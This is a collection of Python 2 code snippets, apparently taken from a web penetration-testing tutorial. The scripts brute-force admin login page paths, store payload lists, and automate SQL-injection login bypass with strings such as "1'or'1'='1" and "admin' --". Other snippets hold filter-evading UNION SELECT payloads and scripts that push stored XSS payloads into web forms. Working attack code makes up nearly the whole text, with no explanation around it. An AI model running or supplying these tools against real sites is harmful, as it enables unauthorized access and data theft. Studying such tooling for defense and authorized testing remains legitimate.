["```py\nimport httplib\nimport shelve # to store login pages name \nurl = raw_input(\"Enter the full URL \")\nurl1 =url.replace(\"http://\",\"\")\nurl2= url1.replace(\"/\",\"\")\ns = shelve.open(\"mohit.raj\",writeback=True)\n\nfor u in s['php']:\n  a = \"/\"\n  url_n = url2+a+u\n  print url_n\n  http_r = httplib.HTTPConnection(url2)\n  u=a+u\n  http_r.request(\"GET\",u)\n  reply = http_r.getresponse()\n\n  if reply.status == 200:\n    print \"n URL found ---- \", url_n\n    ch = raw_input(\"Press c for continue : \")\n    if ch == \"c\" or ch == \"C\" :\n      continue \n    else :\n      break\n\ns.close()\n```", "```py\nimport shelve\ndef create():\n  print \"This only for One key \"\n  s = shelve.open(\"mohit.raj\",writeback=True)\n  s['php']= []\n\ndef update():\n  s = shelve.open(\"mohit.raj\",writeback=True)\n  val1 = int(raw_input(\"Enter the number of values  \"))\n\n  for x in range(val1):\n    val = raw_input(\"n Enter the valuet\")\n    (s['php']).append(val)\n  s.sync()\n  s.close()\n\ndef retrieve():\n  r = shelve.open(\"mohit.raj\",writeback=True)\n  for key in r:\n    print \"*\"*20\n    print key\n    print r[key]\n    print \"Total Number \", len(r['php'])\n  r.close()\n\nwhile (True):\n  print \"Press\"\n  print \"  C for Create, t  U for Update,t  R for retrieve\"\n  print \"  E for exit\"\n  print \"*\"*40\n  c=raw_input(\"Enter t\")  \n  if (c=='C' or c=='c'):\n    create()\n\n  elif(c=='U' or c=='u'):\n    update()\n\n  elif(c=='R' or c=='r'):\n    retrieve()\n\n  elif(c=='E' or c=='e'):\n    exit()\n  else:\n    print \"t Wrong Input\"\n```", "```py\n$sql = \"SELECT count(*) FROM cros where (User=\".$uname.\" and Pass=\".$pass.\")\";\n```", "```py\n $sql = \"SELECT count(*) FROM cros where (User=\"1\" or \"1\"=\"1.\" and Pass=\"1\" or \"1\"=\"1\")\";.\n```", "```py\nimport mechanize\nimport re \nbr = mechanize.Browser()\nbr.set_handle_robots( False )\nurl = raw_input(\"Enter URL \")\nbr.set_handle_equiv(True)\nbr.set_handle_gzip(True)\nbr.set_handle_redirect(True)\nbr.set_handle_referer(True)\nbr.set_handle_robots(False)\nbr.open(url)\n\nfor form in br.forms():\n  print form\nbr.select_form(nr=0)\npass_exp = [\"1'or'1'='1\",'1\" or \"1\"=\"1']\n\nuser1 = raw_input(\"Enter the Username \")\npass1 = raw_input(\"Enter the Password \")\n\nflag =0\np =0\nwhile flag ==0:\n  br.select_form(nr=0)\n  br.form[user1] = 'admin'\n  br.form[pass1] = pass_exp[p]\n  br.submit()\n  data = \"\"\n  for link in br.links():\n    data=data+str(link)\n\n  list = ['logout','logoff', 'signout','signoff']\n  data1 = data.lower()\n\n  for l in list:\n    for match in re.findall(l,data1):\n      flag = 1\n  if flag ==1:\n    print \"t Success in \",p+1,\" attempts\"\n    print \"Successfull hit --> \",pass_exp[p]\n\n  elif(p+1 == len(pass_exp)):\n    print \"All exploits over \"\n    flag =1\n  else :\n    p = p+1\n```", "```py\nfor l in list:\n    for match in re.findall(l,data1):\n      flag = 1\n```", "```py\nelif(p+1 == len(pass_exp)):\n    print \"All exploits over \"\n    flag =1\n```", "```py\nimport mechanize\nimport re \nbr = mechanize.Browser()\nbr.set_handle_robots( False )\nurl = raw_input(\"Enter URL \")\nbr.set_handle_equiv(True)\nbr.set_handle_gzip(True)\nbr.set_handle_redirect(True)\nbr.set_handle_referer(True)\nbr.set_handle_robots(False)\nbr.open(url)\n\nfor form in br.forms():\n  print form\nform = raw_input(\"Enter the form name \" )\nbr.select_form(name =form)\nuser_exp = ['admin\" --', \"admin' --\",   'admin\" #', \"admin' #\" ]\n\nuser1 = raw_input(\"Enter the Username \")\npass1 = raw_input(\"Enter the Password \")\n\nflag =0\np =0\nwhile flag ==0:\n  br.select_form(name =form)\n  br.form[user1] = user_exp[p]\n  br.form[pass1] = \"aaaaaaaa\"\n  br.submit()\n  data = \"\"\n  for link in br.links():\n    data=data+str(link)\n\n  list = ['logout','logoff', 'signout','signoff']\n  data1 = data.lower()\n\n  for l in list:\n    for match in re.findall(l,data1):\n      flag = 1\n  if flag ==1:\n    print \"t Success in \",p+1,\" attempts\"\n    print \"Successfull hit --> \",user_exp[p]\n\n  elif(p+1 == len(user_exp)):\n    print \"All exploits over \"\n    flag =1\n  else :\n    p = p+1\n```", "```py\n/*!UNION*/ SELECT 1,2,3,4,5,6,--\n/*!00000UNION*/ SELECT 1,2,database(),4,5,6 \u2013\n/*!UnIoN*/ /*!sElEcT*/ 1,2,3,4,5,6 \u2013\n```", "```py\nimport mechanize\nimport re \nimport shelve\nbr = mechanize.Browser()\nbr.set_handle_robots( False )\nurl = raw_input(\"Enter URL \")\nbr.set_handle_equiv(True)\nbr.set_handle_gzip(True)\n#br.set_handle_redirect(False)\nbr.set_handle_referer(True)\nbr.set_handle_robots(False)\nbr.open(url)\ns = shelve.open(\"mohit.xss\",writeback=True)\nfor form in br.forms():\n  print form\n\natt = raw_input(\"Enter the attack field \")\nnon = raw_input(\"Enter the normal field \")\nbr.select_form(nr=0)\n\np =0\nflag = 'y'\nwhile flag ==\"y\":\n  br.open(url)\n  br.select_form(nr=0)\n  br.form[non] = 'aaaaaaa'\n  br.form[att] = s['xss'][p]\n  print s['xss'][p]\n  br.submit()\n  ch = raw_input(\"Do you continue press y \")\n  p = p+1\n  flag = ch.lower()\n```", "```py\nimport shelve\ndef create():\n  print \"This only for One key \"\n  s = shelve.open(\"mohit.xss\",writeback=True)\n  s['xss']= []\n\ndef update():\n  s = shelve.open(\"mohit.xss\",writeback=True)\n  val1 = int(raw_input(\"Enter the number of values  \"))\n\n  for x in range(val1):\n    val = raw_input(\"n Enter the valuet\")\n    (s['xss']).append(val)\n  s.sync()\n  s.close()\n\ndef retrieve():\n  r = shelve.open(\"mohit.xss\",writeback=True)\n  for key in r:\n    print \"*\"*20\n    print key\n    print r[key]\n    print \"Total Number \", len(r['xss'])\n  r.close()\n\nwhile (True):\n  print \"Press\"\n  print \"  C for Create, t  U for Update,t  R for retrieve\"\n  print \"  E for exit\"\n  print \"*\"*40\n  c=raw_input(\"Enter t\")  \n  if (c=='C' or c=='c'):\n    create()\n\n  elif(c=='U' or c=='u'):\n    update()\n\n  elif(c=='R' or c=='r'):\n    retrieve()\n\n  elif(c=='E' or c=='e'):\n    exit()\n  else:\n    print \"t Wrong Input\"\n```", "```py\nimport mechanize\nimport shelve\nbr = mechanize.Browser()\nbr.set_handle_robots( False )\nurl = raw_input(\"Enter URL \")\nbr.set_handle_equiv(True)\nbr.set_handle_gzip(True)\n#br.set_handle_redirect(False)\nbr.set_handle_referer(True)\nbr.set_handle_robots(False)\nbr.open(url)\ns = shelve.open(\"mohit.xss\",writeback=True)\nfor form in br.forms():\n  print form\nlist_a =[]\nlist_n = []\nfield = int(raw_input('Enter the number of field \"not readonly\" '))\nfor i in xrange(0,field):\n  na = raw_input('Enter the field name, \"not readonly\" ')\n  ch = raw_input(\"Do you attack on this field? press Y \")\n  if (ch==\"Y\" or ch == \"y\"):\n    list_a.append(na)\n  else :\n    list_n.append(na)\n\nbr.select_form(nr=0)\n\np =0\nflag = 'y'\nwhile flag ==\"y\":\n  br.open(url)\n  br.select_form(nr=0)\n  for i in xrange(0, len(list_a)):\n    att=list_a[i]\n    br.form[att] = s['xss'][p]\n  for i in xrange(0, len(list_n)):\n    non=list_n[i]\n    br.form[non] = 'aaaaaaa'\n\n  print s['xss'][p]\n  br.submit()\n  ch = raw_input(\"Do you continue press y \")\n  p = p+1\n  flag = ch.lower()\n```", "```py\nlist_a =[]\nlist_n = []\nfield = int(raw_input('Enter the number of field \"not readonly\" '))\nfor i in xrange(0,field):\n  na = raw_input('Enter the field name, \"not readonly\" ')\n  ch = raw_input(\"Do you attack on this field? press Y \")\n  if (ch==\"Y\" or ch == \"y\"):\n    list_a.append(na)\n  else :\n    list_n.append(na)\n```", "```py\nfor i in xrange(0, len(list_a)):\n    att=list_a[i]\n    br.form[att] = s['xss'][p]\n  for i in xrange(0, len(list_n)):\n    non=list_n[i]\n    br.form[non] = 'aaaaaaa'\n```"]